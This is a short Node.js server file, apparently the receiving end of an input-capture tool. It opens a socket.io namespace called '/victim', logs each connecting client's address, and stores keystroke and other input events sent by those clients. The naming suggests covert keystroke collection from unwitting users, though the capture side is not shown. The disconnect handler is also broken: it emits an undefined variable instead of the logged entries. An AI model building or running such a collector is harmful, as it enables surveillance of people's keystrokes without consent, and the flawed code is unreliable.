var path = require('path')
, express = require('express')
,     app = express()
,  events = require('events')
,  server = require('http').Server(app)
,      io = require('socket.io')(server)
,  victim

var exports = module.exports = new events.EventEmitter();

exports.mount = function(ui){
 exports.ui = ui
 app.use(express.static('/Users/DIGIAIR/dgzn/electron-vertheron/public'));
 console.log("serving static");
 victim = io
 .of('/victim')
 .on('connection', function(socket){
   const client = socket.handshake.address.split(':')
   var log = []
   console.log('√ ' + client[client.length - 1])
   socket.on('input', function(e){
    e.shown = 0
    if (e.type != 'key') {
      e.shown = 1
      log[e.id] = e
      exports.emit('output', e)
    }
    log[e.id] = e
   });
   socket.on('disconnect', function(){
    for (var i in log)
      if (log[i].shown < 1)
        exports.emit('output', e)
   });
 });
 server.listen(3232);
}
